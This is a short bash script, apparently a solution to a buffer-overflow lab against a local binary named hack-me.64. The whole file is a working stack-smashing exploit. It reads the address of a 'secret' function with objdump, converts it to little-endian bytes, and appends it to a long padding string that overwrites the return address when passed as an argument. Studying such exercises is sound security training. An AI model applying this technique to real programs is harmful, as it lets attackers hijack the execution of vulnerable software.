#!/bin/bash

secret_addr=$(objdump -d ./hack-me.64 | grep secret | cut -d ' ' -f 1 | sed 's/^0*//')

addr_size=`expr ${#secret_addr} - 2`

rip=""

while [[ addr_size -ge 0 ]]; do
	rip=$rip$(echo -ne \\x${secret_addr:addr_size:2})
	addr_size=`expr ${addr_size} - 2`
done

string="32165498703216549870321649870321654987032165498703216549870321654987032165498703216549870321654987032165498703216498703216549870321654987032165498703216549870321654987032165498703216549870321654987032165498703216549870321654987032165498703216549870321654987012345678901234567aaaaa"$rip

./hack-me.64 $string
